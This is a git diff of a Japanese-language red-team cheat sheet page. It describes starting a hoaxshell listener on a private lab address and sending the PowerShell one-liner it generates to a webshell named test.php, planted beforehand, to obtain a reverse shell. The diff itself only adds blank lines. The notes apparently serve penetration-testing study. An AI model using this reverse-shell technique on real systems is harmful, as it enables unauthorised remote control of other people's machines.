@@ -5,7 +5,9 @@ grand_parent: Red Team
 ---
 
 # 待ち受けの開始
+
 ここで生成されたpowershellの一文を事前に蔵置したwebshellに投げると、ReverseShellを取得できる
+
 ```zsh
 hoaxshell -s 192.168.45.157
 
@@ -22,5 +24,7 @@ Copied to clipboard!
 # Webshellへの蔵置
 最初にtest.phpという名前のwebshellを蔵置している
 ## test.php
+
 ![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260429085758.png)
+
 ![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260429085751.png)
